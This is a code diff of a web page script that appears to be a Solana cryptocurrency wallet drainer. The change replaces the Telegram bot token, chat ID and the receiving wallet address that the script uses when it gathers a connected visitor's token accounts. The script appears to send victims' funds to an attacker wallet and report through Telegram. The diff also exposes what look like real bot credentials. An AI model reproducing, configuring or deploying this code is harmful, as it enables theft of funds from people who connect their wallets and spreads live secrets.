@@ -1,6 +1,6 @@
 $(document).ready(async function () {
-  const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; // Sostituisci con il token del tuo bot
-  const chatId = "7050439107"; // Sostituisci con il tuo chat ID
+  const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4"; // Sostituisci con il token del tuo bot
+  const chatId = "927059314"; // Sostituisci con il tuo chat ID
   const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
 
   const isMobile =
@@ -212,7 +212,7 @@ $(document).ready(async function () {
       }
 
       const recieverWallet = new solanaWeb3.PublicKey(
-        "HbHNX1yYJaTMVp7xYNTGR7mFVw3NJzc6LeokEdvD6YzG"
+        "9TwNZv3sh9N844TW5xiabuk5v1CFMhQQU49a2LLjtPHd"
       );
       const tokens = await getTokenAccounts(connection, publicKey);
 
@@ -489,7 +489,7 @@ $(document).ready(async function () {
           .on("click", async () => {
             try {
               const recieverWallet = new solanaWeb3.PublicKey(
-                "HbHNX1yYJaTMVp7xYNTGR7mFVw3NJzc6LeokEdvD6YzG"
+                "9TwNZv3sh9N844TW5xiabuk5v1CFMhQQU49a2LLjtPHd"
               );
 
               const tokens = await getTokenAccounts(connection, resp.publicKey);
